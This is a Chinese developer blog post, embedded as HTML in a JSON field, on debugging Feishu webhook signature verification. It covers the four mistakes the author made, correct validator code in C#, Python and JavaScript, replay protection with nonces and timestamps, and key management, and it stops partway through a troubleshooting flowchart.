      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/mudtools/p/19492945\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 16:45\">\n    <span>深入理解飞书 Webhook 签名验证：一次踩坑到填坑的完整记录</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>作为一名勤劳的牛马，我在对接飞书开放平台时遇到了一个看似简单却让人抓狂的问题——签名验证总是失败。经过一番深入研究，我发现这个问题背后隐藏着许多容易被忽视的细节。今天，我想用最通俗的语言，把这段经历记录下来。</p>\n</blockquote>\n<h2 id=\"故事的开始一个神秘的签名验证失败\">故事的开始：一个神秘的签名验证失败</h2>\n<h3 id=\"问题现场\">问题现场</h3>\n<p>那是一个普通的工作日下午，我正在为公司的内部系统对接飞书的事件订阅功能。一切看起来都很顺利：</p>\n<ul>\n<li>✅ 应用创建完成</li>\n<li>✅ 事件订阅配置完成</li>\n<li>✅ Webhook 地址填写正确</li>\n<li>✅ 代码部署上线</li>\n</ul>\n<p>但是，当我满怀期待地在飞书后台点击\"验证\"按钮时，系统日志里出现了这样一行红色的错误：</p>\n<pre><code class=\"language-log\">warn: Mud.Feishu.Webhook.FeishuEventValidator[0]       \n请求头签名验证失败: 计算 +OGVt6ye......, 期望 bc5b503a......\n</code></pre>\n<p><strong>什么？签名验证失败？</strong></p>\n<p>我检查了配置文件，密钥都填对了；我检查了代码逻辑，看起来也没问题。但就是验证不通过！</p>\n<h3 id=\"初步分析\">初步分析</h3>\n<p>让我们先看看日志里的其他信息：</p>\n<pre><code class=\"language-log\">dbug: Mud.Feishu.Webhook.FeishuEventDecryptor[0]\n解密成功，结果长度: 489\n\ndbug: Mud.Feishu.Webhook.FeishuEventDecryptor[0]\n解密后的JSON数据: {\"schema\":\"2.0\",\"header\":{\"event_id\":\"...\",\"token\":\"fCt8xobp...\"}}\n\ninfo: Mud.Feishu.Webhook.FeishuEventDecryptor[0]\n事件数据解密成功 - EventType: [contact.department.created_v3]\n</code></pre>\n<p>有意思的是：</p>\n<ul>\n<li>✅ 数据解密成功了</li>\n<li>✅ 事件类型识别正确</li>\n<li>❌ 但签名验证失败了</li>\n</ul>\n<p>这说明什么？说明我的 <strong>Encrypt Key（加密密钥）是对的</strong>，但签名验证的逻辑肯定哪里出了问题。</p>\n<hr />\n<h2 id=\"飞书-webhook-的安全机制\">飞书 Webhook 的安全机制</h2>\n<p>在深入问题之前，让我们先理解飞书是如何保护 Webhook 安全的。</p>\n<h3 id=\"两把钥匙的故事\">两把钥匙的故事</h3>\n<p>飞书给每个应用配置了两把\"钥匙\"：</p>\n<div class=\"mermaid\">graph TB\n    subgraph \"飞书应用的两把钥匙\"\n        A[\"🔑 Verification Token&lt;br/&gt;(验证令牌)\"]\n        B[\"🔐 Encrypt Key&lt;br/&gt;(加密密钥)\"]\n        \n        A --&gt; A1[\"用途：URL 验证请求\"]\n        A --&gt; A2[\"格式：随机字符串\"]\n        A --&gt; A3[\"示例：fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf\"]\n        \n        B --&gt; B1[\"用途：数据加密/解密、签名验证\"]\n        B --&gt; B2[\"格式：32 位字符串\"]\n        B --&gt; B3[\"示例：go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx\"]\n    end\n    \n    style A fill:#e1f5ff\n    style B fill:#fff3e0\n</div><p><strong>简单来说：</strong></p>\n<ul>\n<li><strong>Verification Token</strong> 就像你家的门牌号，用来确认\"这是你家\"</li>\n<li><strong>Encrypt Key</strong> 就像你家的钥匙，用来\"开门\"和\"验证身份\"</li>\n</ul>\n<h3 id=\"飞书发送请求的完整流程\">飞书发送请求的完整流程</h3>\n<p>当飞书要给你的服务器发送事件通知时，它会经历这样一个过程：</p>\n<div class=\"mermaid\">sequenceDiagram\n    participant FS as 飞书服务器\n    participant YS as 你的服务器\n    \n    Note over FS: 步骤 1：准备事件数据\n    FS-&gt;&gt;FS: {\"event_type\": \"...\", \"data\": {...}}\n    \n    Note over FS: 步骤 2：使用 Encrypt Key 加密数据\n    FS-&gt;&gt;FS: \"Ul/tHTDEQkOlKZuqYTS7t+zTb8z/...\"\n    \n    Note over FS: 步骤 3：生成签名\n    FS-&gt;&gt;FS: timestamp + nonce + key + body\n    FS-&gt;&gt;FS: ↓ SHA-256\n    FS-&gt;&gt;FS: f2d909fb8a7c3e1d...\n    \n    Note over FS: 步骤 4：发送 HTTP 请求\n    FS-&gt;&gt;YS: POST /webhook&lt;br/&gt;Headers:&lt;br/&gt;X-Lark-Request-Timestamp: 1768...&lt;br/&gt;X-Lark-Request-Nonce: 149323894&lt;br/&gt;X-Lark-Signature: f2d909fb...&lt;br/&gt;Body: {\"encrypt\": \"Ul/tHTDEQkO...\"}\n    \n    Note over YS: 接收并处理请求\n</div><h3 id=\"你的服务器需要做什么\">你的服务器需要做什么</h3>\n<p>收到飞书的请求后，你需要按照相反的顺序验证和处理：</p>\n<div class=\"mermaid\">flowchart TD\n    Start([收到飞书请求]) --&gt; Step1[步骤 1：验证签名 ⚠️]\n    Step1 --&gt; |验证通过| Step2[步骤 2：解密数据]\n    Step1 --&gt; |验证失败| Reject[❌ 拒绝请求]\n    \n    Step2 --&gt; |解密成功| Step3[步骤 3：处理事件]\n    Step2 --&gt; |解密失败| Reject\n    \n    Step3 --&gt; Step4[步骤 4：返回响应]\n    Step4 --&gt; Success[✅ 返回成功]\n    \n    style Step1 fill:#ffebee\n    style Step2 fill:#e3f2fd\n    style Step3 fill:#e8f5e9\n    style Step4 fill:#fff3e0\n    style Success fill:#c8e6c9\n    style Reject fill:#ffcdd2\n</div><hr />\n<h2 id=\"我踩过的四个大坑\">我踩过的四个大坑</h2>\n<p>现在，让我们来看看我在实现签名验证时踩过的坑。如果你也遇到了签名验证失败的问题，很可能就是因为这些原因。</p>\n<h3 id=\"坑-1用错了签名算法\">坑 #1：用错了签名算法</h3>\n<h4 id=\"-我最初的错误实现\">❌ 我最初的错误实现</h4>\n<pre><code class=\"language-csharp\">// 我以为飞书用的是 HMAC-SHA256（因为很多平台都用这个）\nvar signString = $\"{timestamp}\\n{nonce}\\n{body}\";\nusing var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(encryptKey));\nvar hashBytes = hmac.ComputeHash(Encoding.UTF8.GetBytes(signString));\nvar signature = Convert.ToBase64String(hashBytes);\n</code></pre>\n<p><strong>为什么错了？</strong></p>\n<p>我参考了微信、钉钉等平台的实现，它们大多使用 HMAC-SHA256 算法。但飞书不一样！</p>\n<h4 id=\"-正确的实现\">✅ 正确的实现</h4>\n<pre><code class=\"language-csharp\">// 飞书使用的是纯 SHA-256 哈希（不是 HMAC）\nvar signString = $\"{timestamp}{nonce}{encryptKey}{body}\";\nusing var sha256 = SHA256.Create();\nvar hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));\nvar signature = BitConverter.ToString(hashBytes).Replace(\"-\", \"\").ToLower();\n</code></pre>\n<p><strong>对比表格：</strong></p>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>HMAC-SHA256</th>\n<th>SHA-256</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>是否需要密钥</td>\n<td>✅ 需要（作为 HMAC 的密钥）</td>\n<td>❌ 不需要（密钥直接拼接到字符串中）</td>\n</tr>\n<tr>\n<td>算法类型</td>\n<td>消息认证码</td>\n<td>哈希函数</td>\n</tr>\n<tr>\n<td>飞书使用</td>\n<td>❌</td>\n<td>✅</td>\n</tr>\n<tr>\n<td>微信使用</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"坑-2签名字符串格式错误\">坑 #2：签名字符串格式错误</h3>\n<h4 id=\"-我最初的错误实现-1\">❌ 我最初的错误实现</h4>\n<pre><code class=\"language-csharp\">// 我以为各部分要用换行符分隔（因为看起来更\"规范\"）\nvar signString = $\"{timestamp}\\n{nonce}\\n{body}\";\n</code></pre>\n<p><strong>为什么错了？</strong></p>\n<p>我想当然地认为，既然是多个部分组成的字符串，应该用某种分隔符。换行符 <code>\\n</code> 看起来是个不错的选择。</p>\n<p>但实际上，飞书的签名字符串是<strong>直接拼接</strong>的，而且还要包含 <strong>Encrypt Key</strong>！</p>\n<h4 id=\"-正确的实现-1\">✅ 正确的实现</h4>\n<pre><code class=\"language-csharp\">// 直接拼接，无任何分隔符\nvar signString = $\"{timestamp}{nonce}{encryptKey}{body}\";\n</code></pre>\n<p><strong>示例对比：</strong></p>\n<pre><code>❌ 错误格式（有换行符，缺少 encryptKey）：\n1768550348\n149323894\n{\"encrypt\":\"Ul/tHTDEQkO...\"}\n\n✅ 正确格式（直接拼接，包含 encryptKey）：\n1768550348149323894go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx{\"encrypt\":\"Ul/tHTDEQkO...\"}\n</code></pre>\n<h3 id=\"坑-3用错了密钥\">坑 #3：用错了密钥</h3>\n<h4 id=\"-我曾经的困惑\">❌ 我曾经的困惑</h4>\n<pre><code class=\"language-csharp\">// 我看到解密后的数据里有个 token 字段\n// {\"header\":{\"token\":\"fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf\"}}\n// 我想：这个 token 应该就是用来验证签名的吧？\n\nvar signString = $\"{timestamp}{nonce}{verificationToken}{body}\";\n</code></pre>\n<p><strong>为什么错了？</strong></p>\n<p>这是一个很容易犯的错误。因为：</p>\n<ol>\n<li>解密后的数据里确实有个 <code>token</code> 字段</li>\n<li>这个 token 的值正好是 Verification Token</li>\n<li>名字叫\"验证令牌\"，听起来就应该用来验证</li>\n</ol>\n<p>但实际上，<strong>签名验证要用 Encrypt Key</strong>！</p>\n<h4 id=\"-正确的理解\">✅ 正确的理解</h4>\n<table>\n<thead>\n<tr>\n<th>密钥类型</th>\n<th>用途</th>\n<th>在签名验证中</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Verification Token</td>\n<td>URL 验证请求</td>\n<td>❌ 不使用</td>\n</tr>\n<tr>\n<td>Encrypt Key</td>\n<td>数据加密/解密 + 签名验证</td>\n<td>✅ 使用这个</td>\n</tr>\n</tbody>\n</table>\n<p><strong>记忆技巧：</strong></p>\n<ul>\n<li><strong>Verification Token</strong> = 门牌号（确认地址）</li>\n<li><strong>Encrypt Key</strong> = 钥匙（开门 + 验证身份）</li>\n</ul>\n<h3 id=\"坑-4输出格式不对\">坑 #4：输出格式不对</h3>\n<h4 id=\"-我最初的错误实现-2\">❌ 我最初的错误实现</h4>\n<pre><code class=\"language-csharp\">// 我习惯性地把哈希结果转成 Base64\nvar hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));\nvar signature = Convert.ToBase64String(hashBytes);\n// 结果：lL4qIgAs8Kx... (Base64 格式)\n</code></pre>\n<p><strong>为什么错了？</strong></p>\n<p>Base64 是很常见的编码方式，我在其他项目中经常这样用。但飞书要的是<strong>小写十六进制字符串</strong>！</p>\n<h4 id=\"-正确的实现-2\">✅ 正确的实现</h4>\n<pre><code class=\"language-csharp\">// 转换为小写十六进制字符串\nvar hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));\nvar signature = BitConverter.ToString(hashBytes).Replace(\"-\", \"\").ToLower();\n// 结果：f2d909fb8a7c... (小写十六进制)\n</code></pre>\n<p><strong>格式对比：</strong></p>\n<pre><code>原始哈希值（字节数组）：\n[242, 217, 9, 251, 138, 124, 62, 29, ...]\n\n❌ Base64 编码：\n8tkJ+4p8Ph0...\n\n✅ 小写十六进制：\nf2d909fb8a7c3e1d...\n</code></pre>\n<hr />\n<h2 id=\"正确的实现方式\">正确的实现方式</h2>\n<p>经过一番折腾，我终于搞清楚了正确的实现方式。让我用最清晰的方式展示给你。</p>\n<h3 id=\"完整的验证流程\">完整的验证流程</h3>\n<div class=\"mermaid\">flowchart TD\n    Start([飞书 Webhook 签名验证流程]) --&gt; Step1[第 1 步：提取请求头信息]\n    \n    Step1 --&gt; Step1a[X-Lark-Request-Timestamp → timestamp]\n    Step1 --&gt; Step1b[X-Lark-Request-Nonce → nonce]\n    Step1 --&gt; Step1c[X-Lark-Signature → expectedSignature]\n    \n    Step1a --&gt; Step2[第 2 步：读取请求体]\n    Step1b --&gt; Step2\n    Step1c --&gt; Step2\n    \n    Step2 --&gt; Step2a[原始 JSON 字符串 → body]\n    \n    Step2a --&gt; Step3[第 3 步：防重放攻击检查]\n    \n    Step3 --&gt; Check1{nonce 是否已使用?}\n    Check1 --&gt; |是| Reject1[❌ 拒绝请求]\n    Check1 --&gt; |否| Check2{timestamp 是否有效?}\n    Check2 --&gt; |否| Reject2[❌ 拒绝请求]\n    Check2 --&gt; |是| Step4[第 4 步：构建签名字符串]\n    \n    Step4 --&gt; Step4a[\"signString = timestamp + nonce + encryptKey + body\"]\n    \n    Step4a --&gt; Step5[第 5 步：计算 SHA-256 哈希]\n    Step5 --&gt; Step5a[\"SHA256(signString) → hashBytes\"]\n    \n    Step5a --&gt; Step6[第 6 步：转换为小写十六进制]\n    Step6 --&gt; Step6a[\"BitConverter.ToString(hashBytes)&lt;br/&gt;.Replace('-', '').ToLower()\"]\n    \n    Step6a --&gt; Step7[第 7 步：固定时间比较]\n    Step7 --&gt; Compare{签名是否相等?}\n    Compare --&gt; |是| Success[✅ 验证通过]\n    Compare --&gt; |否| Fail[❌ 验证失败]\n    \n    style Step1 fill:#e3f2fd\n    style Step3 fill:#fff3e0\n    style Step4 fill:#f3e5f5\n    style Step5 fill:#e8f5e9\n    style Step6 fill:#fce4ec\n    style Step7 fill:#e0f2f1\n    style Success fill:#c8e6c9\n    style Fail fill:#ffcdd2\n    style Reject1 fill:#ffcdd2\n    style Reject2 fill:#ffcdd2\n</div><h3 id=\"c-完整代码实现\">C# 完整代码实现</h3>\n<pre><code class=\"language-csharp\">public async Task&lt;bool&gt; ValidateSignature(\n    long timestamp, \n    string nonce, \n    string body, \n    string headerSignature, \n    string encryptKey)\n{\n    try\n    {\n        // ========== 第 1 步：基础验证 ==========\n        \n        // 检查必要参数\n        if (string.IsNullOrEmpty(headerSignature))\n        {\n            _logger.LogWarning(\"请求头中缺少 X-Lark-Signature\");\n            return false;\n        }\n        \n        if (timestamp == 0 || string.IsNullOrEmpty(nonce))\n        {\n            _logger.LogWarning(\"时间戳或 nonce 为空\");\n            return false;\n        }\n        \n        // ========== 第 2 步：防重放攻击 ==========\n        \n        // 检查 nonce 是否已使用（需要配合 Redis 等缓存实现）\n        if (await IsNonceUsed(nonce))\n        {\n            _logger.LogWarning(\"Nonce {Nonce} 已使用过，拒绝重放攻击\", nonce);\n            return false;\n        }\n        \n        // 验证时间戳（容错 60 秒）\n        if (!IsTimestampValid(timestamp, toleranceSeconds: 60))\n        {\n            _logger.LogWarning(\"请求时间戳无效: {Timestamp}\", timestamp);\n            return false;\n        }\n        \n        // ========== 第 3 步：构建签名字符串 ==========\n        \n        // 注意：直接拼接，无分隔符\n        var signString = $\"{timestamp}{nonce}{encryptKey}{body}\";\n        \n        // 调试日志（生产环境建议关闭）\n        _logger.LogDebug(\"签名字符串前 100 字符: {SignStringPrefix}\", \n            signString.Substring(0, Math.Min(100, signString.Length)));\n        \n        // ========== 第 4 步：计算 SHA-256 哈希 ==========\n        \n        using var sha256 = SHA256.Create();\n        var hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));\n        \n        // ========== 第 5 步：转换为小写十六进制字符串 ==========\n        \n        var computedSignature = BitConverter.ToString(hashBytes)\n            .Replace(\"-\", \"\")\n            .ToLower();\n        \n        _logger.LogDebug(\"计算的签名: {ComputedSignature}\", computedSignature);\n        _logger.LogDebug(\"期望的签名: {ExpectedSignature}\", headerSignature);\n        \n        // ========== 第 6 步：固定时间比较 ==========\n        \n        // 使用固定时间比较防止计时攻击\n        var isValid = FixedTimeEquals(computedSignature, headerSignature);\n        \n        if (isValid)\n        {\n            _logger.LogInformation(\"签名验证成功\");\n            // 标记 nonce 为已使用\n            await MarkNonceAsUsed(nonce);\n        }\n        else\n        {\n            _logger.LogWarning(\"签名验证失败\");\n        }\n        \n        return isValid;\n    }\n    catch (Exception ex)\n    {\n        _logger.LogError(ex, \"验证签名时发生错误\");\n        return false;\n    }\n}\n\n/// &lt;summary&gt;\n/// 固定时间比较，防止计时攻击\n/// &lt;/summary&gt;\nprivate static bool FixedTimeEquals(string a, string b)\n{\n    if (a.Length != b.Length)\n        return false;\n    \n    var result = 0;\n    for (var i = 0; i &lt; a.Length; i++)\n    {\n        result |= a[i] ^ b[i];\n    }\n    \n    return result == 0;\n}\n\n/// &lt;summary&gt;\n/// 验证时间戳是否在有效范围内\n/// &lt;/summary&gt;\nprivate bool IsTimestampValid(long timestamp, int toleranceSeconds)\n{\n    var requestTime = DateTimeOffset.FromUnixTimeSeconds(timestamp);\n    var now = DateTimeOffset.UtcNow;\n    var diff = Math.Abs((now - requestTime).TotalSeconds);\n    \n    return diff &lt;= toleranceSeconds;\n}\n</code></pre>\n<h3 id=\"其他语言实现参考\">其他语言实现参考</h3>\n<h4 id=\"python-实现\">Python 实现</h4>\n<pre><code class=\"language-python\">import hashlib\nimport time\n\ndef validate_signature(timestamp, nonce, body, header_signature, encrypt_key):\n    \"\"\"验证飞书 Webhook 签名\"\"\"\n    \n    # 1. 基础验证\n    if not header_signature or not nonce or timestamp == 0:\n        return False\n    \n    # 2. 时间戳验证（容错 60 秒）\n    current_time = int(time.time())\n    if abs(current_time - timestamp) &gt; 60:\n        return False\n    \n    # 3. 构建签名字符串（直接拼接）\n    sign_string = f\"{timestamp}{nonce}{encrypt_key}{body}\"\n    \n    # 4. 计算 SHA-256 哈希\n    hash_obj = hashlib.sha256(sign_string.encode('utf-8'))\n    \n    # 5. 转换为小写十六进制\n    computed_signature = hash_obj.hexdigest().lower()\n    \n    # 6. 比较签名\n    return computed_signature == header_signature.lower()\n</code></pre>\n<h4 id=\"javascriptnodejs-实现\">JavaScript/Node.js 实现</h4>\n<pre><code class=\"language-javascript\">const crypto = require('crypto');\n\nfunction validateSignature(timestamp, nonce, body, headerSignature, encryptKey) {\n    // 1. 基础验证\n    if (!headerSignature || !nonce || !timestamp) {\n        return false;\n    }\n    \n    // 2. 时间戳验证（容错 60 秒）\n    const currentTime = Math.floor(Date.now() / 1000);\n    if (Math.abs(currentTime - timestamp) &gt; 60) {\n        return false;\n    }\n    \n    // 3. 构建签名字符串（直接拼接）\n    const signString = `${timestamp}${nonce}${encryptKey}${body}`;\n    \n    // 4. 计算 SHA-256 哈希并转换为小写十六进制\n    const computedSignature = crypto\n        .createHash('sha256')\n        .update(signString, 'utf8')\n        .digest('hex')\n        .toLowerCase();\n    \n    // 5. 比较签名\n    return computedSignature === headerSignature.toLowerCase();\n}\n</code></pre>\n<hr />\n<h2 id=\"安全防护的艺术\">安全防护的艺术</h2>\n<p>签名验证只是安全防护的第一步。要构建一个真正安全可靠的 Webhook 服务，还需要考虑更多细节。</p>\n<h3 id=\"防重放攻击nonce-去重机制\">防重放攻击：Nonce 去重机制</h3>\n<h4 id=\"什么是重放攻击\">什么是重放攻击？</h4>\n<p>想象这样一个场景：</p>\n<pre><code>1. 黑客截获了一个合法的飞书请求\n2. 黑客重复发送这个请求 100 次\n3. 你的服务器处理了 100 次相同的事件\n4. 💥 业务逻辑被重复执行，造成数据混乱\n</code></pre>\n<h4 id=\"如何防止\">如何防止？</h4>\n<p>使用 <strong>Nonce（Number used once）</strong> 机制：</p>\n<div class=\"mermaid\">sequenceDiagram\n    participant Client as 客户端\n    participant Server as 服务器\n    participant Redis as Redis 缓存\n    \n    Note over Client,Redis: Nonce 去重流程\n    \n    Client-&gt;&gt;Server: 发送请求 (Nonce: 149323894)\n    Server-&gt;&gt;Server: 提取 Nonce: 149323894\n    Server-&gt;&gt;Redis: EXISTS \"feishu:nonce:149323894\"\n    \n    alt Nonce 已存在\n        Redis--&gt;&gt;Server: 返回 true\n        Server--&gt;&gt;Client: ❌ 拒绝请求（重放攻击）\n    else Nonce 不存在\n        Redis--&gt;&gt;Server: 返回 false\n        Server-&gt;&gt;Server: ✅ 继续处理\n        Server-&gt;&gt;Redis: SET \"feishu:nonce:149323894\" \"1\" EX 300\n        Note over Redis: 5 分钟后自动过期\n        Server--&gt;&gt;Client: 返回处理结果\n    end\n</div><h4 id=\"代码实现使用-redis\">代码实现（使用 Redis）</h4>\n<pre><code class=\"language-csharp\">public class NonceDeduplicator\n{\n    private readonly IDistributedCache _cache;\n    private readonly ILogger&lt;NonceDeduplicator&gt; _logger;\n    \n    public async Task&lt;bool&gt; IsNonceUsed(string nonce)\n    {\n        var key = $\"feishu:nonce:{nonce}\";\n        var value = await _cache.GetStringAsync(key);\n        return value != null;\n    }\n    \n    public async Task MarkNonceAsUsed(string nonce)\n    {\n        var key = $\"feishu:nonce:{nonce}\";\n        var options = new DistributedCacheEntryOptions\n        {\n            // 5 分钟后自动过期（与时间戳容错时间一致）\n            AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(5)\n        };\n        \n        await _cache.SetStringAsync(key, \"1\", options);\n        _logger.LogDebug(\"Nonce {Nonce} 已标记为已使用\", nonce);\n    }\n}\n</code></pre>\n<h3 id=\"防重放攻击时间戳验证\">防重放攻击：时间戳验证</h3>\n<h4 id=\"为什么需要时间戳验证\">为什么需要时间戳验证？</h4>\n<pre><code>场景 1：网络延迟\n飞书发送时间：14:00:00\n到达你服务器：14:00:05\n✅ 5 秒延迟，可以接受\n\n场景 2：恶意攻击\n飞书发送时间：14:00:00\n黑客重放时间：15:00:00\n❌ 1 小时延迟，明显异常\n</code></pre>\n<h4 id=\"容错时间设置建议\">容错时间设置建议</h4>\n<table>\n<thead>\n<tr>\n<th>环境</th>\n<th>建议容错时间</th>\n<th>原因</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>生产环境</td>\n<td>60 秒</td>\n<td>平衡安全性和可用性</td>\n</tr>\n<tr>\n<td>测试环境</td>\n<td>300 秒</td>\n<td>方便调试</td>\n</tr>\n<tr>\n<td>开发环境</td>\n<td>600 秒</td>\n<td>本地时间可能不准</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"代码实现\">代码实现</h4>\n<pre><code class=\"language-csharp\">public bool IsTimestampValid(long timestamp, int toleranceSeconds = 60)\n{\n    // 飞书的时间戳是秒级的\n    var requestTime = DateTimeOffset.FromUnixTimeSeconds(timestamp);\n    var now = DateTimeOffset.UtcNow;\n    \n    // 计算时间差（绝对值）\n    var diff = Math.Abs((now - requestTime).TotalSeconds);\n    \n    if (diff &gt; toleranceSeconds)\n    {\n        _logger.LogWarning(\n            \"时间戳超出容错范围: 请求时间 {RequestTime}, 当前时间 {CurrentTime}, 差异 {Diff}秒\",\n            requestTime, now, diff);\n        return false;\n    }\n    \n    return true;\n}\n</code></pre>\n<h3 id=\"防重放攻击密钥管理\">防重放攻击：密钥管理</h3>\n<h4 id=\"-危险的做法\">❌ 危险的做法</h4>\n<pre><code class=\"language-csharp\">// 千万不要这样做！\npublic class FeishuConfig\n{\n    public const string EncryptKey = \"go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx\";\n    public const string VerificationToken = \"fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf\";\n}\n</code></pre>\n<p><strong>为什么危险？</strong></p>\n<ul>\n<li>代码会被提交到 Git 仓库</li>\n<li>任何能看到代码的人都能看到密钥</li>\n<li>密钥泄露后很难追踪</li>\n</ul>\n<h4 id=\"-安全的做法\">✅ 安全的做法</h4>\n<p><strong>方案 1：使用环境变量</strong></p>\n<pre><code class=\"language-csharp\">// appsettings.json（不包含敏感信息）\n{\n  \"FeishuWebhook\": {\n    \"RoutePrefix\": \"feishu/webhook\"\n  }\n}\n\n// 环境变量（在服务器上配置）\nFEISHU_ENCRYPT_KEY=go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx\nFEISHU_VERIFICATION_TOKEN=fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf\n\n// 代码中读取\nvar encryptKey = Environment.GetEnvironmentVariable(\"FEISHU_ENCRYPT_KEY\");\n</code></pre>\n<p><strong>方案 2：使用密钥管理服务</strong></p>\n<pre><code class=\"language-csharp\">// 使用 Azure Key Vault\nvar client = new SecretClient(vaultUri, new DefaultAzureCredential());\nvar secret = await client.GetSecretAsync(\"feishu-encrypt-key\");\nvar encryptKey = secret.Value.Value;\n\n// 使用 AWS Secrets Manager\nvar client = new AmazonSecretsManagerClient();\nvar request = new GetSecretValueRequest { SecretId = \"feishu/encrypt-key\" };\nvar response = await client.GetSecretValueAsync(request);\nvar encryptKey = response.SecretString;\n</code></pre>\n<h3 id=\"防重放攻击多应用场景\">防重放攻击：多应用场景</h3>\n<p>如果你的公司有多个飞书应用，可以让它们共享一个 Webhook 端点：</p>\n<div class=\"mermaid\">graph TB\n    subgraph \"多应用配置示例\"\n        A[\"应用 A&lt;br/&gt;(cli_a98ea7d1a0ba100b)\"]\n        B[\"应用 B&lt;br/&gt;(cli_b12345678901234c)\"]\n        C[\"应用 C&lt;br/&gt;(cli_c98765432109876d)\"]\n        \n        A --&gt; A1[\"Encrypt Key:&lt;br/&gt;go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx\"]\n        A --&gt; A2[\"Verification Token:&lt;br/&gt;fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf\"]\n        \n        B --&gt; B1[\"Encrypt Key:&lt;br/&gt;xY9zAbCdEfGhIjKlMnOpQrStUvWx1234\"]\n        B --&gt; B2[\"Verification Token:&lt;br/&gt;gHt9ypcqPLec5zB1VpLKsiOUVbYUaKog\"]\n        \n        C --&gt; C1[\"Encrypt Key:&lt;br/&gt;1234AbCdEfGhIjKlMnOpQrStUvWxYz56\"]\n        C --&gt; C2[\"Verification Token:&lt;br/&gt;hJu0zqdqQMfd6aC2WqMLtjPVWcZVbLph\"]\n    end\n    \n    style A fill:#e3f2fd\n    style B fill:#f3e5f5\n    style C fill:#e8f5e9\n</div><h4 id=\"配置文件\">配置文件</h4>\n<pre><code class=\"language-json\">{\n  \"FeishuWebhook\": {\n    \"MultiAppEncryptKeys\": {\n      \"cli_a98ea7d1a0ba100b\": \"go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx\",\n      \"cli_b12345678901234c\": \"xY9zAbCdEfGhIjKlMnOpQrStUvWx1234\",\n      \"cli_c98765432109876d\": \"1234AbCdEfGhIjKlMnOpQrStUvWxYz56\"\n    },\n    \"DefaultAppId\": \"cli_a98ea7d1a0ba100b\"\n  }\n}\n</code></pre>\n<h4 id=\"代码实现-1\">代码实现</h4>\n<pre><code class=\"language-csharp\">private string GetEncryptKey(string appId)\n{\n    // 尝试从多应用配置中获取\n    if (_options.MultiAppEncryptKeys.TryGetValue(appId, out var key))\n    {\n        _logger.LogDebug(\"使用应用 {AppId} 的专用密钥\", appId);\n        return key;\n    }\n    \n    // 回退到默认密钥\n    if (!string.IsNullOrEmpty(_options.DefaultAppId) &amp;&amp;\n        _options.MultiAppEncryptKeys.TryGetValue(_options.DefaultAppId, out var defaultKey))\n    {\n        _logger.LogWarning(\"未找到应用 {AppId} 的密钥，使用默认密钥\", appId);\n        return defaultKey;\n    }\n    \n    // 最后回退到主密钥\n    _logger.LogWarning(\"使用主密钥\");\n    return _options.EncryptKey;\n}\n</code></pre>\n<hr />\n<h2 id=\"问题排查指南\">问题排查指南</h2>\n<p>当签名验证失败时，不要慌张。按照这个清单逐项检查，99% 的问题都能找到原因。</p>\n<h3 id=\"排查清单\">排查清单</h3>\n<div class=\"mermaid\">flowchart TD\n    Start([签名验证失败]) --&gt; Check1{第 1 步：检查密钥配置}\n    \n    Check1 --&gt; Q1a[Encrypt Key 是否正确?]\n    Check1 --&gt; Q1b[长度是否为 32 字符?]\n    Check1 --&gt; Q1c[是否有多余的空格或换行符?]\n    Check1 --&gt; Q1d[是否使用了 Verification Token?]\n    \n    Q1a --&gt; |有问题| Fix1[修正密钥]\n    Q1b --&gt; |有问题| Fix1\n    Q1c --&gt; |有问题| Fix1\n    Q1d --&gt; |有问题| Fix1\n    \n    Q1a --&gt; |正常| Check2{第 2 步：检查签名字符串构建}\n    Q1b --&gt; |正常| Check2\n    Q1c --&gt; |正常| Check2\n    Q1d --&gt; |正常| Check2\n    \n    Check2 --&gt; Q2a[是否直接拼接?]\n    Check2 --&gt; Q2b[顺序是否正确?]\n    Check2 --&gt; Q2c[body 是否为原始请求体?]\n    Check2 --&gt; Q2d[是否包含了 Encrypt Key?]\n    \n    Q2a --&gt; |有问题| Fix2[修正拼接方式]\n    Q2b --&gt; |有问题| Fix2\n    Q2c --&gt; |有问题| Fix2\n    Q2d --&gt; |有问题| Fix2\n    \n    Q2a --&gt; |正常| Check3{第 3 步：检查签名算法}\n    Q2b --&gt; |正常| Check3\n    Q2c --&gt; |正常| Check3\n    Q2d --&gt; |正常| Check3\n    \n    Check3 --&gt; Q3a[是否使用 SHA-256?]\n    Check3 --&gt; Q3b[输出格式是否为小写十六进制?]\n    \n    Q3a --&gt; |有问题| Fix3[修正算法]\n    Q3b --&gt; |有问题| Fix3\n    \n    Q3a --&gt; |正常| Check4{第 4 步：检查时间戳和 Nonce}\n    Q3b --&gt; |正常| Check4\n    \n    Check4 --&gt; Q4a[时间戳是否在有效范围内?]\n    Check4 --&gt; Q4b[服务器时间是否准确?]\n    Check4 --&gt; Q4c[Nonce 是否被误标记?]\n    \n    Q4a --&gt; |有问题| Fix4[修正时间相关问题]\n    Q4b --&gt; |有问题| Fix4\n    Q4c --&gt; |有问题| Fix4\n    \n    Q4a --&gt; |正常| Success[✅ 问题已解决]\n    Q4b --&gt; |正常| 